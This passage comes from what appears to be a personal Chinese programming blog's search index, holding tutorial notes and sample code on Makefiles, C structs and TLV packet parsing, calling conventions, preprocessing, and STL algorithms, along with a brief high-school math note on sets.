12345通常都是大写CC:默认值ccCPPFLAGS:预处理器需要的选项 -ICFLAGS:编译的时候使用的参数 -Wall -g -cLDFLAGS: 链接库使用的选项 -L -l 123456789obj=main.o add.otarget=mainCC=gcc$(target):$(obj) $(CC) $(obj) -o $(target)%.o:%.c $(CC) -c $&lt; -o $@","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"集合","slug":"集合","date":"2021-12-22T07:49:50.000Z","updated":"2021-12-22T10:25:04.830Z","comments":true,"path":"2021/12/22/集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/12/22/集合/","excerpt":"","text":"集合 定义：把一些不同的、可以确定的对象看作整体 对象：元素 整体：集合 性质：确定性、互异性、无序性 表示：集合用大写字母 A B C ​ 元素用小写表示 ​ N 代表自然数 ​ R 代表实数 ​ N*或N+ 代表正整数 ​ Z 代表整数 ​ Q 有理数 ​ C 复数 属于:a∈A 代表a在集合A里 不属于:b∉A 代表元素b不属于集合B 空集: ∅ 集合表示方法 列举法 描述法 韦恩图法 区间法","categories":[{"name":"高中数学","slug":"高中数学","permalink":"https://xiaowuyoucy.github.io/categories/高中数学/"}],"tags":[]},{"title":"结构体与指针应用_封包构造与解析","slug":"C0004结构体与指针应用-封包构造与解析","date":"2021-09-28T09:34:41.000Z","updated":"2021-12-28T18:51:49.247Z","comments":true,"path":"2021/09/28/C0004结构体与指针应用-封包构造与解析/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/09/28/C0004结构体与指针应用-封包构造与解析/","excerpt":"","text":"封包：网络传输中的包 自定义协议如下： 4字节 命令类型 1字节 附加数据个数 4字节 保留字段 TLV结构 type - 1字节 1 - 代表字符串 2 - 二进制数据 length - 4字节大小 value - 值 // 构造数据 命令类型 110 保留字0填充 2个TLV 一个是字符串 hello 一个是字符串agp 封包要使用#pragma pack(1) 1字节对齐 用#pragma pack()还原 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#pragma pack(1)typedef struct&#123; byte bType; int ilength; char* cValue;&#125;TLV;typedef struct&#123; int iCmdID; byte bCount; int iResolve; TLV tlv[0];&#125;COMMAND;#pragma pack() // 发送命令函数void SendCmd(void* pDate, int size);void ParseCmd(void* pDate, int size);// 命令类型 110 保留字0填充// 2个TLV 一个是字符串 hello 一个是字符串agpint main(void)&#123; // 声明变量 TLV tl1; TLV tl2; char* pString1 = NULL; char* pString2 = NULL; COMMAND* pCmd = NULL; int iCmdLength = 0; int iTLVCount = 0; memset(&amp;tl1, 0, sizeof(TLV)); memset(&amp;tl2, 0, sizeof(TLV)); // 构造字符串 pString1 = malloc(strlen(\"hello\")); memcpy(pString1, \"hello\", strlen(\"hello\")); pString2 = malloc(strlen(\"agp\")); memcpy(pString2, \"agp\", strlen(\"agp\")); // 构造tlv1 tl1.ilength = strlen(\"hello\"); tl1.bType = 1; tl1.cValue = pString1; // 构造tlv2 tl2.ilength = strlen(\"agp\"); tl2.bType = 1; tl2.cValue = pString2; // 构造发送包 iCmdLength = sizeof(COMMAND) + tl1.ilength + tl2.ilength + 2 * 5; pCmd = malloc(iCmdLength); pCmd-&gt;iCmdID = 110; pCmd-&gt;bCount = 2; pCmd-&gt;iResolve = 0; memcpy((void*)((int)pCmd + sizeof(COMMAND)), &amp;tl1, 5); memcpy((void*)((int)pCmd + sizeof(COMMAND) + 5), tl1.cValue, tl1.ilength); memcpy((void*)((int)pCmd + sizeof(COMMAND) + 5 + tl1.ilength), &amp;tl2, 5); memcpy((void*)((int)pCmd + sizeof(COMMAND) + 5 + tl1.ilength + 5), tl2.cValue, tl2.ilength); SendCmd(pCmd,iCmdLength); // 解析 ParseCmd(pCmd,iCmdLength); system(\"pause\"); return 0;&#125;void* g_PDate = NULL;void SendCmd(void* pDate, int size)&#123; g_PDate = malloc(size); memcpy(g_PDate, pDate, size);&#125;void ParseCmd(void* pDate, int size)&#123; int i = 0; COMMAND* cmd = (COMMAND*)pDate; TLV* ptl1 = malloc(sizeof(TLV)); TLV* ptl2 = malloc(sizeof(TLV)); char* pString1 = NULL; char* pString2 = NULL; memset(ptl1, 0, sizeof(TLV)); memset(ptl2, 0, sizeof(TLV)); printf(\"命令ID:%d\\r\\n\", cmd-&gt;iCmdID); printf(\"TLV个数:%d\\r\\n\", cmd-&gt;bCount); printf(\"保留字段:%d\\r\\n\", cmd-&gt;iResolve); printf(\"TLV数据--------------------\\r\\n\"); ptl1 = (TLV*)((int)pDate + sizeof(COMMAND)); printf(\"TL1类型:%d\\r\\n\", ptl1-&gt;bType); printf(\"TL1长度:%d\\r\\n\", ptl1-&gt;ilength); pString1 = malloc(ptl1-&gt;ilength + 1); memcpy(pString1, (void*)((int)ptl1 + sizeof(TLV) - 4), ptl1-&gt;ilength); pString1[ptl1-&gt;ilength] = 0; printf(\"TL1数据:%s\\r\\n\", pString1); ptl2 = (TLV*)((int)pDate + sizeof(COMMAND) + ptl1-&gt;ilength + sizeof(TLV) - 4); printf(\"TL2类型:%d\\r\\n\", ptl2-&gt;bType); printf(\"TL2长度:%d\\r\\n\", ptl2-&gt;ilength); pString2 = malloc(ptl2-&gt;ilength + 1); memcpy(pString2, (void*)((int)ptl2 + sizeof(TLV) - 4), ptl2-&gt;ilength); pString2[ptl2-&gt;ilength] = 0; printf(\"TL2数据:%s\\r\\n\", pString2);&#125;","categories":[{"name":"c","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"函数调用过程与调用约定","slug":"C0002函数调用过程与调用约定","date":"2021-09-27T17:39:51.000Z","updated":"2021-12-28T18:51:55.729Z","comments":true,"path":"2021/09/28/C0002函数调用过程与调用约定/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/09/28/C0002函数调用过程与调用约定/","excerpt":"","text":"函数调用约定 __cdecl 缺省调用方式，函数采用从右到左的压栈方式，调用方清理堆栈，注意可变参数 __stdcall 函数的参数自右向左通过栈传递，被调用方清理堆栈 __fastcall 通过寄存器来传送参数，被调用方清理堆栈 __thiscall用于C++成员函数，使用ecx存放this指针 naked call 裸函数，上面几种方式会产生保存一些寄存器的代码，这种不产生。naked call不是类型修饰符，必须和_declspec共同使用 __declspec(naked) 是告诉编译器 不要对函数进行优化 函数的所有实现包括堆栈的平衡 参数的压栈 ebp的赋值 还原 都要我们来做 决定以下内容： 1)函数参数的压栈顺序 2)由调用者还是被调用者把参数弹出栈 3)以及产生函数修饰名的方法 修饰名 1、修饰名(Decoration name)：&quot;C&quot;或者&quot;C++“函数在内部（编译和链接）通过修饰名识别 2、C编译时函数名修饰约定规则： __stdcall调用约定在输出函数名前加上一个下划线前缀，后面加上一个”@&quot;符号和其参数的字节数，格式为_functionname@number, 例如 ：function(int a, int b)，其修饰名为：_function@8 __cdecl调用约定仅在输出函数名前加上一个下划线前缀，格式为_functionname。 __fastcall调用约定在输出函数名前加上一个&quot;@“符号，后面也是一个”@&quot;符号和其参数的字节数，格式为@functionname@number。 注： 123一般WIN32的函数都是__stdcall #define CALLBACK __stdcall #define WINAPI __stdcall 例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;// 默认是__cdeclint cAdd(int a, int b, int c)&#123; return a + b + c;&#125;//堆栈平衡由函数内部处理int __stdcall stdAdd(int a, int b, int c)&#123; return a + b + c;&#125;//前两个参数使用寄存器存储,堆栈平衡由函数内部处理int __fastcall fastAdd(int a, int b, int c)&#123; return a + b + c;&#125;//堆栈平衡由我们自己处理int __declspec(naked) nkAdd(int a, int b, int c)&#123; __asm &#123; push [esp + 0ch] push [esp + 0ch] push [esp + 0ch] call stdAdd mov eax,eax ret &#125; &#125;int main(void)&#123; int result; // 内联汇编 __asm &#123; mov eax,eax mov eax,eax mov eax,eax &#125; result = cAdd(1,2,3); printf(\"%d\",result); stdAdd(1,2,3); printf(\"%d\",result); fastAdd(1,2,3); printf(\"%d\",result); nkAdd(1,2,3); printf(\"%d\",result); //CreateThread(); system(\"pause\"); return 0;&#125;","categories":[{"name":"c","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"结构体、共用体、枚举","slug":"C0003结构体、共用体、枚举","date":"2021-09-27T16:52:48.000Z","updated":"2021-12-28T18:51:52.755Z","comments":true,"path":"2021/09/28/C0003结构体、共用体、枚举/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/09/28/C0003结构体、共用体、枚举/","excerpt":"","text":"结构体 不同类型数据的集合 定义 12struct 结构名&#123;结构成员表&#125;; 123456789101112131415161718struct student&#123;int no;char name[10];int age;double socre;char addr[50];struct date birth;&#125;;struct date&#123;int year;int month;int day;&#125;;struct student st1; 初始化，可直接清空 memset 函数原型: 1void *memset(void *s, int ch, size_t n); 1memset(&amp;st, 0, sizeof(st)); //用0填充st内存 memcpy 函数原型: 1void *memcpy(void *destin, void *source, unsigned n); 1memcpy(st.name, &quot;agp&quot;, strlen(&quot;agp&quot;)); //将“agp”复制到st.name内存中 typedef 使用typedef创建结构体、共用体、枚举类型别名 12345678910111213141516171819202122232425typedef struct date&#123; int year; int month; int day;&#125;MDATE;typedef union data&#123; char c[10]; int a; double f;&#125; MDATA;MDATA x;typedef enum week &#123; sun, mon, tue, wed, thu, fri, sta&#125;WEEK; 结构体指针变量访问成员 访问方法，指针用-&gt; . 大小 内存对齐 X86 默认4字节对齐 12#pragma pack(1) 修改内存对齐为1一般是 网络通信 双机通信~~ 使用 sizeof(结构名或者变量名) 对齐原因：有些平台每次读都是从偶地址开始，如果一个int型（假设为 32位）如果存放在偶地址开始的地方，那么一个读周期就可以读出，而如果存放在奇地址开始的地方，就可能会需要2个读周期，并对两次读出的结果的高低 字节进行拼凑才能得到该int数据。显然在读取效率上下降很多。这也是空间和时间的博弈。 http://baike.baidu.com/view/925608.htm 原则：地址可以被整除 结构数组 地址1 结构1 地址2 结构2 … 共用体union 共用一块内存，某个时刻只有一个有效 1234567union data&#123;char c[10];int a;double f;&#125;;union data x; 枚举enum 提高程序可读性 有名字的整形常量的集合，该类型变量只能取其中的一个值 12enum week &#123;sun, mon, tue, wed,thu, fri, sta&#125;; 不赋值 默认从0开始enum week w = sun; //sun == 0","categories":[{"name":"c","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"编译过程与预处理","slug":"C0001编译过程与预处理","date":"2021-09-27T15:41:21.000Z","updated":"2021-12-28T18:52:02.836Z","comments":true,"path":"2021/09/27/C0001编译过程与预处理/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/09/27/C0001编译过程与预处理/","excerpt":"","text":"1.编写文本代码，C或Cpp文件 2.编译，就是Compile，由C编译程序对你写的代码进行词法和语法分析，发现并报告错误。 如若无错，则生成中间代码，扩展名.obj，此时是二进制 3.链接，Link，生成可执行的Exe文件。由于一个程序的源码可由多个文件组成。这些文件在第二步 中分别编译，生成各自的目标文件，这一步的作用便是将这些Obj文件，以及程序中需要的其它库文件(Dll除开），统一到一个文件中来，形成单个的Exe 文件。此Exe文件便可以在操作系统下直接运行了。 源文件－－&gt;预编译处理－－&gt;编译(优化,汇编程序)－－&gt;链接程序–&gt;可执行文件 预处理：编译成目标文件前对源程序进行处理 宏处理 #define 预处理指令#开头，无逗号，可出现在任意位置，作用域为出现位置到文件结尾 12345678910#define 一改全改#define PI 3.14#define MAX(a, b) (a &gt; b ? a : b)#define Add(a,b) a+b c * Add(a,b) * d == c * a + b * d，导致计算错误，解决方法是在a+b中加上括号(a + b )#undef 宏名 //取消宏定义 123456789101112多行定义 \\#define MAX(a, b) (a &gt; b ? \\ a : b) #define APG_DELETE(p) do&#123; delete p; p = NULL&#125; while(0)if(NULL != p) APG_DELETE(p)else ...do sth...if(NULL != p) AGP_DELETE(p);else ...do sth... 文件包含 #include #include&lt;头文件名称&gt;: 先在系统路径搜索文件（一般是include） #include&quot;头文件名称&quot;：先在当前目录搜索 条件编译与#program 123#if 0或1 //如果是0则不编译，如果是1则编译#endif 12345#ifdef 宏名 //如果宏名已定义，执行块1，否则执行块2块1....#else块2.....#endif 1234#ifndef 宏名 //如果宏名没有定义，我们就定义一个这样的宏，防止头文件被重复包含#define 宏名...#endif 1#program once //防止头文件被重复包含，只能在vs中用","categories":[{"name":"c","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"STL中常用的集合算法","slug":"cpp0094-STL中常用的集合算法","date":"2021-07-26T15:13:19.000Z","updated":"2021-12-28T18:41:01.061Z","comments":true,"path":"2021/07/26/cpp0094-STL中常用的集合算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/26/cpp0094-STL中常用的集合算法/","excerpt":"","text":"STL中常用的集合算法 set_union(),set_intersection(),set_difference() set_union: 构造一个有序序列，包含两个有序序列的并集。 set_intersection: 构造一个有序序列，包含两个有序序列的交集。 假设有集合A和B，所有属于A且不属于B的元素的集合被称为A与B的差集。 示例：对于集合A = {a, b, c, d}和集合B = {b, c, w}，则A与B 的差集为{a, d} 也就是集合A中有的元素,在集合B中没有的这部分元素，就是集合A和集合B中的差集 set_difference: 构造一个有序序列，该序列保留第一个有序序列中存在而第二个有序序列中不存在的元素。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ vecIntA.push_back(7);​ vecIntA.push_back(9); ​ vector&lt;int&gt; vecIntB;​ vecIntB.push_back(1);​ vecIntB.push_back(3);​ vecIntB.push_back(5);​ vecIntB.push_back(6);​ vecIntB.push_back(8); ​ vector&lt;int&gt; vecIntC;​ vecIntC.resize(10); ​ //并集​ set_union(vecIntA.begin(), vecIntA.end(), vecIntB.begin(), vecIntB.end(), vecIntC.begin()); //vecIntC : &#123;1,3,5,6,7,8,9,0,0,0&#125; ​ //交集​ fill(vecIntC.begin(),vecIntC.end(),0);​ set_intersection(vecIntA.begin(), vecIntA.end(), vecIntB.begin(), vecIntB.end(), vecIntC.begin()); //vecIntC: &#123;1,3,5,0,0,0,0,0,0,0&#125; ​ //差集​ fill(vecIntC.begin(),vecIntC.end(),0);​ set_difference(vecIntA.begin(), vecIntA.end(), vecIntB.begin(), vecIntB.end(), vecIntC.begin()); //vecIntC: &#123;7,9,0,0,0,0,0,0,0,0&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;using namespace std;void printV(int &amp;x) &#123; cout &lt;&lt; x &lt;&lt; \" \";&#125;void test_union() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(3); v1.push_back(5); vector&lt;int&gt; v2; v2.push_back(2); v2.push_back(4); v2.push_back(6); vector&lt;int&gt; v3; v3.resize(v1.size() + v2.size()); //v1∪v2,把相同部分去掉,将结果存放到v3容器中 set_union(v1.begin(),v1.end(),v2.begin(),v2.end(),v3.begin()); for_each(v3.begin(),v3.end(), printV); cout &lt;&lt; endl;&#125;void test_set_intersection() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(3); v1.push_back(5); vector&lt;int&gt; v2; v2.push_back(1); v2.push_back(3); v2.push_back(6); vector&lt;int&gt; v3; v3.resize(v1.size()+v2.size()); //v1∩v2,将不相同的部分去掉,把结果存放到v3容器中 set_intersection(v1.begin(),v1.end(),v2.begin(),v2.end(),v3.begin()); for_each(v3.begin(), v3.end(), printV); cout &lt;&lt; endl;&#125;void test_difference() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(2); v1.push_back(3); v1.push_back(4); v1.push_back(4); v1.push_back(6); vector&lt;int&gt; v2; v2.push_back(1); v2.push_back(2); v2.push_back(3); v2.push_back(5); vector&lt;int&gt; v3; v3.resize(v1.size() + v2.size()); /* set_difference 差集: v1 - v2 将剩余元素存放在v3中 假设有集合A和B，所有属于A且不属于B的元素的集合被称为A与B的差集。 示例：对于集合A = &#123;a, b, c, d&#125;和集合B = &#123;b, c, w&#125;，则A与B 的差集为&#123;a, d&#125; */ set_difference(v1.begin(), v1.end(), v2.begin(), v2.end(), v3.begin()); for_each(v3.begin(), v3.end(), printV); cout &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test_union(); test_set_intersection(); test_difference(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"STL中常用的算术和生成算法","slug":"cpp0093-STL中常用的算术和生成算法","date":"2021-07-26T14:44:33.000Z","updated":"2021-12-28T18:40:55.196Z","comments":true,"path":"2021/07/26/cpp0093-STL中常用的算术和生成算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/26/cpp0093-STL中常用的算术和生成算法/","excerpt":"","text":"STL中常用的算术和生成算法 accumulate() accumulate: 对指定范围内的元素求和，然后结果再加上一个由val指定的初始值。 要加上头文件 #include&lt;numeric&gt; 123456789101112131415vector&lt;int&gt; vecIntA;vecIntA.push_back(1);vecIntA.push_back(3);vecIntA.push_back(5);vecIntA.push_back(7);vecIntA.push_back(9);int iSum = accumulate(vecIntA.begin(), vecIntA.end(), 100); //iSum==125 fill() fill: 将输入值赋给标志范围内的所有元素。 ​ 12345678910111213vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ vecIntA.push_back(7);​ vecIntA.push_back(9); //将vecintA容器中的所有元素都填充为8​ fill(vecIntA.begin(), vecIntA.end(), 8); //8, 8, 8, 8, 8 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;#include&lt;numeric&gt;using namespace std;void test_accumulate()&#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(2); v1.push_back(3); v1.push_back(4); //accumulate : 将容器中所有元素相加,然后在加上最后一个参数的值,并返回 int sum = accumulate(v1.begin(),v1.end(),100); cout &lt;&lt; sum &lt;&lt; endl;&#125;void test_fill() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(1); v1.push_back(1); v1.push_back(1); //将v1所有元素都填充为100 fill(v1.begin(),v1.end(),100); for (vector&lt;int&gt;::iterator it = v1.begin(); it != v1.end(); it++) &#123; cout &lt;&lt; *it &lt;&lt; \" \"; &#125; cout &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test_accumulate(); test_fill(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"常用的拷贝和替换STL算法","slug":"cpp0092-常用的拷贝和替换STL算法","date":"2021-07-26T14:23:54.000Z","updated":"2021-12-28T18:40:32.286Z","comments":true,"path":"2021/07/26/cpp0092-常用的拷贝和替换STL算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/26/cpp0092-常用的拷贝和替换STL算法/","excerpt":"","text":"常用的拷贝和替换STL算法 copy() 将容器1中的元素拷贝到容器2中 copy(容器1.begin(),容器1.end(),容器2.begin()) 123456789101112131415161718192021vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ vecIntA.push_back(7);​ vecIntA.push_back(9); ​ vector&lt;int&gt; vecIntB;​ vecIntB.resize(5); //扩大空间 ​ copy(vecIntA.begin(), vecIntA.end(), vecIntB.begin()); //vecIntB: &#123;1,3,5,7,9&#125; replace() replace(beg,end,oldValue,newValue): 将指定范围内的所有等于oldValue的元素替换成newValue。 ​ 123456789101112131415 vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ vecIntA.push_back(3);​ vecIntA.push_back(9); ​ replace(vecIntA.begin(), vecIntA.end(), 3, 8); //&#123;1,8,5,8,9&#125; replace_if() replace_if(begin,end,一元谓词,要替换的数字) replace_if : 将指定范围内所有操作结果为true的元素用新值替换。 用法举例： replace_if(vecIntA.begin(),vecIntA.end(),GreaterThree,newVal) 其中 vecIntA是用vector&lt;int&gt;声明的容器 GreaterThree 函数的原型是 bool GreaterThree(int iNum) 1234567891011121314151617//把大于等于3的元素替换成8​ vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ vecIntA.push_back(3);​ vecIntA.push_back(9); ​ replace_if(vecIntA.begin(), vecIntA.end(), GreaterThree, 8); // GreaterThree的定义在上面。 swap() swap: 交换两个容器的元素 swap(容器1,容器2) 12345678910111213141516171819 vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ ​ vector&lt;int&gt; vecIntB;​ vecIntB.push_back(2);​ vecIntB.push_back(4); ​ swap(vecIntA, vecIntB); //交换 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;using namespace std;void printV(int &amp;x) &#123; cout &lt;&lt; x &lt;&lt; \" \" ;&#125;void test_copy() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(21); v1.push_back(31); v1.push_back(41); v1.push_back(51); vector&lt;int&gt; v2; v2.resize(v1.size()); copy(v1.begin(), v1.end(),v2.begin()); for_each(v2.begin(),v2.end(),printV); cout &lt;&lt; endl;&#125;void test_replace() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(1); v1.push_back(1); v1.push_back(21); v1.push_back(31); v1.push_back(41); v1.push_back(51); //将v1的所以元素是1的,都替换成5 replace(v1.begin(),v1.end(),1,5); for_each(v1.begin(),v1.end(),printV); cout &lt;&lt; endl;&#125;bool MyGreate(int &amp; i) &#123; if (i &gt;= 1) &#123; return true; &#125; return false;&#125;void test_replaceif() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(1); v1.push_back(1); v1.push_back(21); v1.push_back(51); //将v1容器中大于等于1的所有元素都替换成5 replace_if(v1.begin(),v1.end(), MyGreate,5); for_each(v1.begin(),v1.end(),printV); cout &lt;&lt; endl;&#125;void test_swap() &#123; vector&lt;int&gt; v1, v2; v1.push_back(1); v1.push_back(3); v1.push_back(5); v2.push_back(2); v2.push_back(4); v2.push_back(6); //交换前 cout &lt;&lt; \"v1: \"; for_each(v1.begin(), v1.end(), printV); cout &lt;&lt; endl; swap(v1, v2); //交换后 cout &lt;&lt; \"v1: \"; for_each(v1.begin(),v1.end(),printV); cout &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test_copy(); test_replace(); test_replaceif(); test_swap(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"常用的排序算法","slug":"cpp0091-常用的排序算法","date":"2021-07-24T19:38:28.000Z","updated":"2021-12-28T18:40:28.447Z","comments":true,"path":"2021/07/25/cpp0091-常用的排序算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/25/cpp0091-常用的排序算法/","excerpt":"","text":"常用的排序算法 merge() 以下是排序和通用算法：提供元素排序策略 merge: 合并两个有序序列，存放到另一个序列。 例如：vecIntA,vecIntB,vecIntC是用vector&lt;int&gt;声明的容器，vecIntA已包含1,3,5,7,9元素，vecIntB已包含2,4,6,8元素 vecIntC.resize(9); //扩大容量 merge(vecIntA.begin(),vecIntA.end(),vecIntB.begin(),vecIntB.end(),vecIntC.begin()); 此时vecIntC就存放了按顺序的1,2,3,4,5,6,7,8,9九个元素 sort() sort: 以默认升序的方式重新排列指定范围内的元素。若要改排序规则，可以输入比较函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061//学生类Class CStudent:&#123;public:​ CStudent(int iID, string strName)​ &#123;m_iID=iID; m_strName=strName; &#125;public: ​ int m_iID;​ string m_strName;&#125; //学号比较函数bool Compare(const CStudent &amp;stuA,const CStudent &amp;stuB)&#123;​ return (stuA.m_iID&lt;strB.m_iID);&#125;void main()&#123;​ vector&lt;CStudent&gt; vecStu;​ vecStu.push_back(CStudent(2,&quot;老二&quot;));vecStu.push_back(CStudent(1,&quot;老大&quot;));vecStu.push_back(CStudent(3,&quot;老三&quot;));vecStu.push_back(CStudent(4,&quot;老四&quot;)); sort(vecStu.begin(),vecStu.end(),Compare); // 此时，vecStu容器包含了按顺序的&quot;老大对象&quot;,&quot;老二对象&quot;,&quot;老三对象&quot;,&quot;老四对象&quot;&#125; random_shuffle() 123456789101112131415161718192021222324252627 random_shuffle: 对指定范围内的元素随机调整次序。​ srand(time(0)); //设置随机种子 ​ vector&lt;int&gt; vecInt;​ vecInt.push_back(1);​ vecInt.push_back(3);​ vecInt.push_back(5);​ vecInt.push_back(7);​ vecInt.push_back(9); ​ string str(&quot;itcastitcast &quot;);​ ​ random_shuffle(vecInt.begin(), vecInt.end()); //随机排序，结果比如：9,7,1,5,3​ random_shuffle(str.begin(), str.end()); //随机排序，结果比如：&quot; itstcasticat &quot; reverse() 123456789101112131415 vector&lt;int&gt; vecInt;​ vecInt.push_back(1);​ vecInt.push_back(3);​ vecInt.push_back(5);​ vecInt.push_back(7);​ vecInt.push_back(9); ​ reverse(vecInt.begin(), vecInt.end()); //&#123;9,7,5,3,1&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;#include&lt;string&gt;#include&lt;ctime&gt;#include&lt;cstdlib&gt;using namespace std;void printV(vector&lt;int&gt; &amp;v) &#123; for (vector&lt;int&gt;::iterator it = v.begin(); it != v.end() ; it++) &#123; cout &lt;&lt; *it &lt;&lt; \" \"; &#125; cout &lt;&lt; endl &lt;&lt; \"============================\" &lt;&lt; endl;&#125;void test_merge() &#123; vector&lt;int&gt; v1; v1.push_back(0); v1.push_back(1); v1.push_back(5); v1.push_back(60); v1.push_back(1); sort(v1.begin(),v1.end()); vector&lt;int&gt; v2; v2.push_back(2); v2.push_back(4); v2.push_back(6); v2.push_back(8); sort(v2.begin(), v2.end()); vector&lt;int&gt; v3; v3.resize(v1.size() + v2.size()); merge(v1.begin(),v1.end(),v2.begin(),v2.end(),v3.begin()); printV(v3);&#125;class Student &#123;public: Student() &#123; m_name = \"\"; m_age = 0; m_id = 0; &#125; Student(string name, int id, int age) &#123; m_name = name; m_age = age; m_id = id; &#125; bool operator()(Student &amp; s1, Student &amp; s2) &#123; if (s1.m_id &lt;= s2.m_id) &#123; if (s1.m_id == s2.m_id) &#123; return s1.m_age &gt;= s2.m_age; &#125; else &#123; return true; &#125; &#125; else &#123; return false; &#125; &#125; void printAll() &#123; cout &lt;&lt; \"name: \" &lt;&lt; m_name &lt;&lt; \"\\tid: \" &lt;&lt; m_id &lt;&lt; \"\\tage: \" &lt;&lt; m_age &lt;&lt; endl; &#125;private: string m_name; int m_id; int m_age;&#125;;void printV2(Student &amp; s) &#123; s.printAll();&#125;void test_sort() &#123; vector&lt;int&gt; v1; v1.push_back(0); v1.push_back(1); v1.push_back(5); v1.push_back(60); v1.push_back(1); sort(v1.begin(),v1.end());//默认升序排序 printV(v1); vector&lt;Student&gt; v2; v2.push_back(Student(\"老大\",1,22)); v2.push_back(Student(\"老大\",1,23)); v2.push_back(Student(\"老二\", 2, 20)); v2.push_back(Student(\"老四\", 4, 18)); v2.push_back(Student(\"老大\",1,22)); v2.push_back(Student(\"老三\", 3, 19)); sort(v2.begin(),v2.end(),Student()); for_each(v2.begin(),v2.end(),printV2);&#125;void test_random_shuffle() &#123; vector&lt;Student&gt; v2; v2.push_back(Student(\"老大\", 1, 22)); v2.push_back(Student(\"老大\", 1, 23)); v2.push_back(Student(\"老二\", 2, 20)); v2.push_back(Student(\"老四\", 4, 18)); v2.push_back(Student(\"老大\", 1, 22)); v2.push_back(Student(\"老三\", 3, 19)); srand(time(NULL)); random_shuffle(v2.begin(),v2.end()); cout &lt;&lt; \"========================\" &lt;&lt; endl; for_each(v2.begin(), v2.end(), printV2); string str = \"1234567\"; random_shuffle(str.begin(), str.end()); cout &lt;&lt; str &lt;&lt; endl;&#125;void test_reverse() &#123; vector&lt;Student&gt; v2; v2.push_back(Student(\"老大\", 1, 22)); v2.push_back(Student(\"老大\", 1, 23)); v2.push_back(Student(\"老二\", 2, 20)); v2.push_back(Student(\"老四\", 4, 18)); v2.push_back(Student(\"老大\", 1, 22)); v2.push_back(Student(\"老三\", 3, 19)); sort(v2.begin(), v2.end(), Student()); reverse(v2.begin(), v2.end()); for_each(v2.begin(),v2.end(),printV2);&#125;int main(char *argv[], int argc)&#123; test_merge(); test_sort(); test_random_shuffle(); test_reverse(); return 